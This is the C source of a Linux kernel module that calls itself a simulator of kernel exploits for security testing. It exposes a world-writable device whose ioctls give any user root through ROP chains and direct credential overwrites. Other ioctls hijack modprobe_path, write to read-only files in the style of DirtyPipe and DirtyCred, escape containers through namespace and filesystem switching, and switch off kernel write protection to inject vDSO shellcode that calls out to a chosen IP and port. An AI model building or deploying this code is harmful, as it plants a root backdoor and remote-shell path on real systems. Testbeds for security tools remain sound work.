#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/miscdevice.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/stat.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/file.h>
#include <linux/pipe_fs_i.h>
#include <linux/path.h>
#include <linux/dcache.h>
#include <linux/slab.h>
#include <linux/nsproxy.h>
#include <linux/kallsyms.h>

#include <asm/vdso.h>
#include <asm/insn.h>
#include <uapi/linux/elf.h>
#include <uapi/asm-generic/unistd.h>
#include <uapi/linux/capability.h>

#include <spe.h>
#include <spe_common.h>
#include <shellcode.h>

MODULE_LICENSE("GPL"); 
MODULE_AUTHOR("Sakuya");
MODULE_DESCRIPTION("A x86-64 kernel module that simulates kernel exploits for security testing.");

static struct pipe_inode_info *(*spe_get_pipe_info)(struct file *, int);
static void (*spe_insn_get_length)(struct insn *);
static void (*spe_switch_task_namespaces)(struct task_struct *, struct nsproxy *);
static struct task_struct *(*spe_find_task_by_vpid)(int);
static int (*spe_capable)(int);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,19,0)
    static void (*spe_insn_init)(struct insn *, const void *, int, int);
#else
    static void (*spe_insn_init)(struct insn *, const void *, int);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
    static int (*spe_setns)(struct pt_regs *);
#else
    static int (*spe_setns)(int, int);
#endif

static unsigned long vdso_addr;
static unsigned long vdso_size;
static unsigned long kpti_trampoline_addr;
static unsigned long retint_addr;
static unsigned long modprobe_path_addr;
static unsigned long init_fs_addr;
static unsigned long init_nsproxy_addr;
static unsigned long rop_gadgets[GADGETS_NUMS];
static unsigned long gettimeofday_addr;
static unsigned long clock_gettime_addr;
static unsigned long vdso_patch_addr;
static struct vdso_saved vdso_saved;
static unsigned int vdso_test = 0;

#ifndef PIPE_BUF_FLAG_CAN_MERGE
    static unsigned long anon_pipe_buf_ops_addr;
#endif

#if !defined(CONFIG_UNWINDER_FRAME_POINTER)&&!defined(CONFIG_FRAME_POINTER)
    static unsigned long pre_rsp;
#endif

unsigned long cr0;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static inline void
write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;

    asm volatile(
	"mov %0, %%cr0"
	:"+r"(val), "+m"(__force_order)
    );
}
#endif

static inline void
protect_memory(void)
{
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    write_cr0_forced(cr0);
#else
    write_cr0(cr0);
#endif
}

static inline void
unprotect_memory(void)
{
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    write_cr0_forced(cr0 & ~0x00010000);
#else
    write_cr0(cr0 & ~0x00010000);
#endif
}

static void __attribute__((__noinline__))
stack_overflow(unsigned long user_ss, unsigned long user_sp, 
               unsigned long user_rflags, unsigned long user_cs, 
               unsigned long user_rip)
{
    #if !defined(CONFIG_UNWINDER_FRAME_POINTER)&&!defined(CONFIG_FRAME_POINTER)
        unsigned long *stack_rop = (unsigned long *)(pre_rsp-8);
    #else
        unsigned long kernel_rbp;
        asm volatile(
        "mov %%rbp, %0;"
        ::"m"(kernel_rbp)
        );
        unsigned long *stack_rop = (unsigned long *)(kernel_rbp+8);
    #endif
    

    

    int k = 0;
    stack_rop[k++] = rop_gadgets[POP_RDI_RET];
    stack_rop[k++] = 0;
    stack_rop[k++] = &prepare_kernel_cred;
    stack_rop[k++] = rop_gadgets[MOV_RDI_RAX_RET];
    stack_rop[k++] = &commit_creds;
    if (kpti_trampoline_addr){
        stack_rop[k++] = kpti_trampoline_addr;
        stack_rop[k++] = 0;             // rax
        stack_rop[k++] = 0;             // rdi
    }else if(retint_addr){
        stack_rop[k++] = retint_addr;
        stack_rop[k++] = 0;             // rax
    }else{
        stack_rop[k++] = rop_gadgets[SWAPGS_IRETQ];
    }
    stack_rop[k++] = user_rip;      // user_rip
    stack_rop[k++] = user_cs;       // user_cs
    stack_rop[k++] = user_rflags;   // user_rflags
    stack_rop[k++] = user_sp;       // user_sp
    stack_rop[k++] = user_ss;       // user_ss
}

static long modify_cred(unsigned int flags, int pid)
{
    struct pid *target_pid = find_vpid(pid);
    if (!target_pid){
        printk(KERN_ERR "SPE: Process %d does not exist\n", pid);
        return 1;
    }
    struct cred *tagert_cred = pid_task(target_pid, PIDTYPE_PID)->cred;
    printk(KERN_INFO "SPE: Process %d original cred\n", pid);
    printk(KERN_INFO "SPE: Uid: %d\t%d\t%d\t%d\n", tagert_cred->uid.val, tagert_cred->euid.val, 
                                                   tagert_cred->suid.val, tagert_cred->fsuid.val);
    printk(KERN_INFO "SPE: Gid: %d\t%d\t%d\t%d\n", tagert_cred->gid.val, tagert_cred->egid.val, 
                                                   tagert_cred->sgid.val, tagert_cred->fsgid.val);
    printk(KERN_INFO "SPE: CapEff: %016lx\n", *((unsigned long *)(&(tagert_cred->cap_effective))));
    printk(KERN_INFO "SPE: CapPrm: %016lx\n", *((unsigned long *)(&(tagert_cred->cap_permitted))));

    if (flags & CRED_UID)   tagert_cred->uid.val   = 0;
    if (flags & CRED_GID)   tagert_cred->gid.val   = 0;
    if (flags & CRED_SUID)  tagert_cred->suid.val  = 0;
    if (flags & CRED_SGID)  tagert_cred->sgid.val  = 0;
    if (flags & CRED_EUID)  tagert_cred->euid.val  = 0;
    if (flags & CRED_EGID)  tagert_cred->egid.val  = 0;
    if (flags & CRED_FSUID) tagert_cred->fsuid.val = 0;
    if (flags & CRED_FSGID) tagert_cred->fsgid.val = 0;
    if (flags & CRED_CAPEFF) *((unsigned long *)(&(tagert_cred->cap_effective))) = 0x01ffffffffff;
    if (flags & CRED_CAPPRM) *((unsigned long *)(&(tagert_cred->cap_permitted))) = 0x01ffffffffff;

    printk(KERN_INFO "SPE: Process %d modified cred\n", pid);
    printk(KERN_INFO "SPE: Uid: %d\t%d\t%d\t%d\n", tagert_cred->uid.val, tagert_cred->euid.val, 
                                                   tagert_cred->suid.val, tagert_cred->fsuid.val);
    printk(KERN_INFO "SPE: Gid: %d\t%d\t%d\t%d\n", tagert_cred->gid.val, tagert_cred->egid.val, 
                                                   tagert_cred->sgid.val, tagert_cred->fsgid.val);
    printk(KERN_INFO "SPE: CapEff: %016lx\n", *((unsigned long *)(&(tagert_cred->cap_effective))));
    printk(KERN_INFO "SPE: CapPrm: %016lx\n", *((unsigned long *)(&(tagert_cred->cap_permitted))));
    return 0;
}

static long modify_modprobe(unsigned long path_addr, unsigned long path_len)
{   
    printk(KERN_INFO "SPE: Original modprobe path %s\n", modprobe_path_addr);
    char *tmp_path = kzalloc(path_len+1, GFP_KERNEL);
    copy_from_user(tmp_path, path_addr, path_len);
    memcpy(modprobe_path_addr, tmp_path, path_len);
    if (!strcmp(modprobe_path_addr, tmp_path)){
        printk(KERN_INFO "SPE: Modified modprobe path %s\n", modprobe_path_addr);
        kfree(tmp_path);
        return 0;
    }else{
        printk(KERN_INFO "SPE: Modify modprobe path failed!\n");
        kfree(tmp_path);
        return 2;
    }
    
}

static void pipe_primitive(int fd, unsigned short flag)
{
    unsigned long v = __fdget(fd);
    struct fd pipe_fd = (struct fd){(struct file *)(v & ~3), v & 3};
    struct pipe_buffer *dirtypipe = (spe_get_pipe_info(pipe_fd.file, 1))->bufs;
    if (flag){
        dirtypipe->len = 0;
    }
    #ifdef PIPE_BUF_FLAG_CAN_MERGE
        dirtypipe->flags = PIPE_BUF_FLAG_CAN_MERGE;
    #else
        dirtypipe->ops = anon_pipe_buf_ops_addr;
    #endif
}

static void modify_fmode(int fd)
{
    unsigned long v = __fdget(fd);
    struct fd file_fd = (struct fd){(struct file *)(v & ~3), v & 3};
    struct file *file_file = file_fd.file;
    file_file->f_mode |= FMODE_WRITE;
    #ifdef FMODE_CAN_WRITE
        file_file->f_mode |= FMODE_CAN_WRITE;
    #endif
    char *p = kmalloc(PATH_MAX, GFP_KERNEL);
    char *path;
    path = dentry_path_raw(file_file->f_path.dentry, p, PATH_MAX);
    printk(KERN_INFO "SPE: Modified file:%s filemode!\n", path);
    kfree(p);
}

static void heap_overflow(int fd)
{
    unsigned long v = __fdget(fd);
    struct fd pipe_fd = (struct fd){(struct file *)(v & ~3), v & 3};
    struct pipe_inode_info *uaf_inode = spe_get_pipe_info(pipe_fd.file, 1);
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 5, 0)
        uaf_inode->ring_size = 1;
    #else
        uaf_inode->buffers = 1;
    #endif
    struct pipe_buffer *uaf_pipe = uaf_inode->bufs;
    unsigned long *heap_addr = (unsigned long*)(uaf_pipe);
    struct pipe_buf_operations *ops = (struct pipe_buf_operations *)((unsigned long)heap_addr+0x2A0);

    #if !defined(CONFIG_UNWINDER_FRAME_POINTER)&&!defined(CONFIG_FRAME_POINTER)
        ops->release = rop_gadgets[PUSH_RSP_POP_RDX_PUSH_RSI_POP_RSP_RET];
    #else
        ops->release = rop_gadgets[PUSH_RSI_POP_RSP_RET];
    #endif   
    
    heap_addr[0] = rop_gadgets[ADD_RSP_20H_RET];
    int k = 5;
    heap_addr[k++] = rop_gadgets[POP_RDI_RET];
    heap_addr[k++] = (unsigned long)heap_addr+0x290;
    heap_addr[k++] = rop_gadgets[MOV_QWORD_PTR_RDI_RBP_RET];
    
    #if !defined(CONFIG_UNWINDER_FRAME_POINTER)&&!defined(CONFIG_FRAME_POINTER)
        heap_addr[k++] = rop_gadgets[POP_RDI_RET];
        heap_addr[k++] = (unsigned long)heap_addr+0x288;
        heap_addr[k++] = rop_gadgets[MOV_QWORD_PTR_RDI_RDX_RET];
    #endif 
    
    heap_addr[k++] = rop_gadgets[POP_RDI_RET];
    heap_addr[k++] = 0;
    heap_addr[k++] = &prepare_kernel_cred;
    heap_addr[k++] = rop_gadgets[MOV_RDI_RAX_RET];
    heap_addr[k++] = &commit_creds;
    heap_addr[k++] = rop_gadgets[POP_RBP_RET];
    heap_addr[k++] = (unsigned long)heap_addr+0x290;
    heap_addr[k++] = rop_gadgets[PUSH_QWORD_PTR_RBP_POP_RBP_RET];

    #if !defined(CONFIG_UNWINDER_FRAME_POINTER)&&!defined(CONFIG_FRAME_POINTER)
        heap_addr[k++] = rop_gadgets[POP_RDI_RET];
        heap_addr[k++] = (unsigned long)heap_addr+0x288;
        heap_addr[k++] = rop_gadgets[PUSH_QWORD_PTR_RDI_POP_RSP_RET];
    #else
        heap_addr[k++] = rop_gadgets[MOV_RSP_RBP_POP_RBP_RET];
    #endif

    uaf_pipe->ops = ops;
}

static void vdso_parse()
{
    struct elf64_hdr *vdso_hdr = (struct elf64_hdr *)vdso_addr;
    Elf64_Half vdso_shstrndx = vdso_hdr->e_shstrndx;
    struct elf64_shdr *vdso_shdr = (struct elf64_shdr *)(vdso_addr + vdso_hdr->e_shoff);
    unsigned long vdso_shstr_addr = vdso_addr + vdso_shdr[vdso_shstrndx].sh_offset;
    unsigned long vdso_dynstr_addr;
    struct elf64_sym *vdso_sym;
    unsigned int dynsym_num;

    Elf64_Half i,vdso_shnum = vdso_hdr->e_shnum;
    for (i = 0; i < vdso_shnum; i++){
        if(!strcmp(vdso_shstr_addr+vdso_shdr[i].sh_name,".dynstr")){
            vdso_dynstr_addr = vdso_addr + vdso_shdr[i].sh_offset;
        }
        if(!strcmp(vdso_shstr_addr+vdso_shdr[i].sh_name,".dynsym")){
            vdso_sym = (struct elf64_sym *)(vdso_addr + vdso_shdr[i].sh_offset);
            dynsym_num = vdso_shdr[i].sh_size/sizeof(struct elf64_sym);
        }   
    }

    for (i = 0; i < dynsym_num; i++){
        if(!strcmp(vdso_dynstr_addr+vdso_sym[i].st_name,"gettimeofday")){
            gettimeofday_addr = vdso_addr + (vdso_sym[i].st_value&0xfff);
        }
        if(!strcmp(vdso_dynstr_addr+vdso_sym[i].st_name,"clock_gettime")){
            clock_gettime_addr = vdso_addr + (vdso_sym[i].st_value&0xfff);
        }
    }
    vdso_patch_addr = gettimeofday_addr;
    if (!vdso_patch_addr) {
        vdso_patch_addr = clock_gettime_addr;
    }
    if (!vdso_patch_addr) {
        vdso_addr = 0;
        printk(KERN_ERR "SPE: vDSO Error!\n");
    }
}

static long vdso_patch(unsigned int ip, unsigned short port)
{
    if(vdso_saved.patched_code){
        printk(KERN_ERR "SPE: vDSO has already been patched!\n");
		return 1;
    }
    if(!vdso_addr){
        printk(KERN_ERR "SPE: vDSO Error!\n");
        return 2;
    }
    
    unsigned long shellcode_addr = vdso_addr + vdso_size - shellcode_len;
    unsigned char *p = shellcode_addr;
    int i;
    for (i = 0; i < shellcode_len; i++) {
		if (p[i] != '\x00') {
            printk(KERN_ERR "SPE: Failed to find a place for the shellcode!\n");
			return 2;
		}
	}

    unprotect_memory();
    memcpy(shellcode_addr, shellcode, shellcode_len);
    unsigned int *shellcode_ip = (unsigned int *)search_mem(shellcode_addr, PATTERN_IP, sizeof(PATTERN_IP)-1);
    *shellcode_ip = ip;
    unsigned short *shellcode_port = (unsigned short *)search_mem(shellcode_addr, PATTERN_PORT, sizeof(PATTERN_PORT)-1);
    *shellcode_port = port;
    unsigned long prologue_addr = search_mem(shellcode_addr, PATTERN_PROLOGUE, sizeof(PATTERN_PROLOGUE)-1);

    if (*(unsigned char *)vdso_patch_addr == 0xe9){                 
        vdso_saved.patched_code = kzalloc(6, GFP_KERNEL);
        vdso_saved.code_len = 5;
        memcpy(vdso_saved.patched_code, vdso_patch_addr, 5);

        int jmp_off = *(int *)(vdso_patch_addr+1);
        unsigned long jmp_addr = jmp_off + (vdso_patch_addr+5);
        int pro_to_jmp = jmp_addr - (prologue_addr+5);
        *(unsigned char *)prologue_addr = 0xe9;
        *(int *)(prologue_addr+1) = pro_to_jmp;
        int jmp_to_shellcode = shellcode_addr - (vdso_patch_addr+5);
        *(int *)(vdso_patch_addr+1) = jmp_to_shellcode;
    }else{
        int code_len;
        struct insn insn;
    parse_code:
        code_len = 0;
        vdso_saved.patched_code = kzalloc(16, GFP_KERNEL);
        for (i = 0; code_len < 5; i++){
            #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,19,0)
                spe_insn_init(&insn, vdso_patch_addr+code_len, MAX_INSN_SIZE, 1);
            #else
                spe_insn_init(&insn, vdso_patch_addr+code_len, 1);
            #endif
	        spe_insn_get_length(&insn);
            if (insn.length>=5){ // Relative address may be involved.
                kfree(vdso_saved.patched_code);
                vdso_saved.patched_code = NULL;
                if ((vdso_patch_addr!=clock_gettime_addr)&&(clock_gettime_addr)){
                    vdso_patch_addr = clock_gettime_addr;
                    goto parse_code;
                }else{
                    memset(shellcode_addr, 0, shellcode_len);
                    protect_memory();
                    vdso_addr = 0;
                    printk(KERN_ERR "SPE: vDSO cannot be patched!\n");
                    return 2;
                }
            }
            memcpy(vdso_saved.patched_code+code_len, vdso_patch_addr+code_len, insn.length);
            code_len+=insn.length;
        }
        vdso_saved.code_len = code_len;


        memcpy(prologue_addr, vdso_saved.patched_code, vdso_saved.code_len);
        int pro_back = vdso_patch_addr - (prologue_addr+5);
        *(unsigned char *)(prologue_addr+vdso_saved.code_len) = 0xe9;
        *(int *)(prologue_addr+vdso_saved.code_len+1) = pro_back;

        int jmp_to_shellcode = shellcode_addr - (vdso_patch_addr+5);
        *(unsigned char *)vdso_patch_addr = 0xe9;
        *(int *)(vdso_patch_addr+1) = jmp_to_shellcode;
        for (i = 5; i < vdso_saved.code_len; i++){
            *(unsigned char *)(vdso_patch_addr+i) = 0x90;
        }
    }

    protect_memory();
    if (vdso_patch_addr==clock_gettime_addr){
        return 3;
    }
    return 0;
}

static long vdso_depatch()
{    
    if(!vdso_saved.patched_code){
        printk(KERN_ERR "SPE: vDSO has not been patched!\n");
		return 1;
    }
    unprotect_memory();
    memcpy(vdso_patch_addr, vdso_saved.patched_code, vdso_saved.code_len);
    kfree(vdso_saved.patched_code);
    vdso_saved.patched_code = NULL;

    unsigned long shellcode_addr = vdso_addr + vdso_size - shellcode_len;
    memset(shellcode_addr, 0, shellcode_len);
    protect_memory();
    return 0;
}

static long vdso_patch_test()
{
    if (vdso_test) {
        printk(KERN_ERR "SPE: vDSO has already been patched with test data!\n");
		return 1;
    }

    char test_data[] = "PWN!"; 
    unsigned long test_addr = vdso_addr + vdso_size - 4;
    unsigned char *p = test_addr;
    int i;
    for (i = 0; i < 4; i++) {
		if (p[i] != '\x00') {
            printk(KERN_ERR "SPE: Failed to find a place for the test data!\n");
			return 2;
		}
	}
    
    unprotect_memory();
    memcpy(test_addr, test_data, 4);
    protect_memory();

    vdso_test = 1;
    return 0;
}

static long vdso_depatch_test()
{    
    if(!vdso_test){
        printk(KERN_ERR "SPE: vDSO has not been patched with test data!\n");
		return 1;
    }
    unprotect_memory();

    unsigned long test_addr = vdso_addr + vdso_size - 4;
    unsigned char *p = test_addr;
    memset(test_addr, 0, 4);
    protect_memory();
    vdso_test = 0;

    return 0;
}

static void fs_escape()
{
    current->fs = init_fs_addr;
}

static void ns_escape_init()
{
    spe_switch_task_namespaces(spe_find_task_by_vpid(1), init_nsproxy_addr);
}

static void ns_escape(int fd)
{
    if(!spe_capable(CAP_SYS_ADMIN)){
        commit_creds(prepare_kernel_cred(0));
    }
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
        struct pt_regs pt_regs;
        pt_regs.di = fd;
        pt_regs.si = 0;
        spe_setns(&pt_regs);
    #else
        spe_setns(fd, 0);
    #endif
}

static long spe_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    int obj_pid = current->pid;
    char *obj_comm = (char *)(&(current->comm));

    union{
        struct user_regs user_regs;
        struct cred_modify cred_modify;
        struct modprobe_modify modprobe_modify;
        struct dirty_pipe dirty_pipe;
        struct dirty_cred dirty_cred;
        struct pipe_hijack pipe_hijack;
        struct vdso_patch vdso_patch;
        struct ns_escape ns_escape;
    } payload;
    if (arg){
        copy_from_user(&payload, (void*)arg, sizeof(payload));
    }

    switch (cmd){
    case STACK_OVERFLOW:
        printk(KERN_INFO "SPE: Stack Overflow! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        #if !defined(CONFIG_UNWINDER_FRAME_POINTER)&&!defined(CONFIG_FRAME_POINTER)
            asm volatile(
            "mov %%rsp, %0;"
            ::"m"(pre_rsp)
            );
        #endif
        stack_overflow(payload.user_regs.user_ss, payload.user_regs.user_sp, payload.user_regs.user_rflags,
                       payload.user_regs.user_cs, payload.user_regs.user_rip);
        break;
    case MODIFY_CRED:
        printk(KERN_INFO "SPE: Modify Process %d Cred! (pid=%d,comm=\"%s\")\n", payload.cred_modify.pid, obj_pid, obj_comm);
        return modify_cred(payload.cred_modify.cred_flags, payload.cred_modify.pid);
        break;
    case MODPROBE:
        printk(KERN_INFO "SPE: Modify Modprobe Path! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        return modify_modprobe(payload.modprobe_modify.path_addr, payload.modprobe_modify.path_len);
    case DIRTYPIPE:
        printk(KERN_INFO "SPE: Modify Read-Only File with DirtyPipe! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        pipe_primitive(payload.dirty_pipe.pipe_fd, payload.dirty_pipe.flag);
        break;
    case DIRTYCRED:
        printk(KERN_INFO "SPE: Modify Read-Only File with DirtyCred! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        modify_fmode(payload.dirty_cred.file_fd);
        break;
    case HEAP_OVERFLOW:
        printk(KERN_INFO "SPE: Heap Overflow! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        heap_overflow(payload.pipe_hijack.pipe_fd);
        break;
    case PATCH_VDSO:
        printk(KERN_INFO "SPE: Patch vDSO! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        return vdso_patch(payload.vdso_patch.ip, payload.vdso_patch.port);
        break;
    case DEPATCH_VDSO:
        printk(KERN_INFO "SPE: Depatch vDSO! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        return vdso_depatch();
        break;
    case PATCH_VDSO_T:
        printk(KERN_INFO "SPE: Patch vDSO test! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        return vdso_patch_test();
        break;
    case DEPATCH_VDSO_T:
        printk(KERN_INFO "SPE: Depatch vDSO test! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        return vdso_depatch_test();
        break;
    case FS_ESCAPE:
        printk(KERN_INFO "SPE: Container Escape from FileSystem! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        fs_escape();
        break;
    case NS_ESCAPE_INIT:
        printk(KERN_INFO "SPE: Container Process Gets Host Namespaces! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        ns_escape_init();
        break;
    case NS_ESCAPE:
        printk(KERN_INFO "SPE: Container Escape from Namespaces! (pid=%d,comm=\"%s\")\n", obj_pid, obj_comm);
        ns_escape(payload.ns_escape.ns_fd);
        break;
    default:
        break;
    }
    return 0;
}

static struct file_operations fops = 
{
    .owner = THIS_MODULE,
    .open =      NULL,
    .release =   NULL,
    .read =      NULL,
    .write =     NULL,
    .unlocked_ioctl = spe_ioctl
};


static struct miscdevice misc = 
{
    .minor = MISC_DYNAMIC_MINOR,
    .name  = "spe",
    .fops = &fops,
    .mode   = 0666
};

static void rop_gadgets_func(void)
{
    asm volatile(
    ".intel_syntax noprefix;"
    "pop rdi;"
    "ret;"
    "pop rsi;"
    "ret;"
    "pop rdx;"
    "ret;"
    "pop rcx;"
    "ret;"
    "mov rdi, rax;"
    "ret;"
    "push rsp;"
    "pop rdx;"
    "push rsi;"
    "pop rsp;"
    "ret;"
    "add rsp, 0x20;"
    "ret;"
    "mov qword ptr [rdi], rbp;"
    "ret;"
    "push qword ptr [rbp];"
    "pop rbp;"
    "ret;"
    "mov rsp, rbp;"
    "pop rbp;"
    "ret;"
    "swapgs;"
    "iretq;"
    "mov qword ptr [rdi], rdx;"
    "ret;"
    "push qword ptr [rdi];"
    "pop rsp;"
    "ret;"
    ".att_syntax;"
    );
}

static int kernel_addr_init(void)
{
    #ifdef KPROBE_LOOKUP
        unsigned long (*kallsyms_lookup_name)(char*);
        register_kprobe(&kp);
	    kallsyms_lookup_name = kp.addr;
	    unregister_kprobe(&kp);
    #endif

    if (!kallsyms_lookup_name){
        printk(KERN_ERR "SPE: Kernel address initialization failure!\n");
        return -1;
    }
    
    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,16,0)
        vdso_addr = ((struct vdso_image *)(kallsyms_lookup_name("vdso_image_64")))->data;
    #else
        vdso_addr = kallsyms_lookup_name("vdso_start");
    #endif
    if ((!strncmp("\x7f\x45\x4c\x46\x02", vdso_addr, 5))&&search_mem(vdso_addr, "__vdso_gettimeofday", 19)){
        #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,16,0)
            vdso_size = ((struct vdso_image *)(kallsyms_lookup_name("vdso_image_64")))->size;
        #else
            vdso_size = *((unsigned long *)(kallsyms_lookup_name("vdso_size")));
        #endif
        vdso_parse();
    }else{
        vdso_addr = 0;
        printk(KERN_ERR "SPE: vDSO Error!\n");
    }


    kpti_trampoline_addr = kallsyms_lookup_name("swapgs_restore_regs_and_return_to_usermode");
    if (!kpti_trampoline_addr){
        retint_addr = kallsyms_lookup_name("retint_userspace_restore_args");
        if (!retint_addr){
            printk(KERN_INFO "SPE: NO KPTI!\n");
        }else{
            search_mem(retint_addr, MOV_RAX_RSP, 3);
        }
    }else{
        kpti_trampoline_addr = search_mem(kpti_trampoline_addr, MOV_RDI_RSP, 3);
    }

    modprobe_path_addr = kallsyms_lookup_name("modprobe_path");
    init_fs_addr = kallsyms_lookup_name("init_fs");
    init_nsproxy_addr = kallsyms_lookup_name("init_nsproxy");
    spe_get_pipe_info = kallsyms_lookup_name("get_pipe_info");
    spe_insn_init = kallsyms_lookup_name("insn_init");
    spe_insn_get_length = kallsyms_lookup_name("insn_get_length");
    spe_switch_task_namespaces = kallsyms_lookup_name("switch_task_namespaces");
    spe_find_task_by_vpid = kallsyms_lookup_name("find_task_by_vpid");
    spe_capable = kallsyms_lookup_name("capable");
    
    spe_setns = kallsyms_lookup_name("__x64_sys_setns");
    if (!spe_setns){
        spe_setns = kallsyms_lookup_name("sys_setns");
    }

    #ifndef PIPE_BUF_FLAG_CAN_MERGE
	    anon_pipe_buf_ops_addr = kallsyms_lookup_name("anon_pipe_buf_ops");
    #endif

    int i;
    for (i = 0; i < GADGETS_NUMS; i++){
        int len = BYTES_MAX-1;
        for (;gadgets_bytes[i][len]==0;len--);
        rop_gadgets[i] = search_mem(&rop_gadgets_func, gadgets_bytes[i], len);
        if (rop_gadgets[i] == 0){
            printk(KERN_ERR "SPE: Kernel address initialization failure!\n");
            return -1;
        }
    }
    return 0;
}

static int __init SPE_init(void) 
{
    printk(KERN_INFO "SPE: Kernel module is loaded!\n");
    cr0 = read_cr0();
    if (kernel_addr_init()==-1){
        return -1;
    }else{
        misc_register(&misc);
        return 0;
    }
}

static void __exit SPE_exit(void) 
{   
    misc_deregister(&misc);
    vdso_depatch();
    vdso_depatch_test();
    printk(KERN_INFO "SPE: Kernel module is unloaded!\n");
}

module_init(SPE_init);
module_exit(SPE_exit);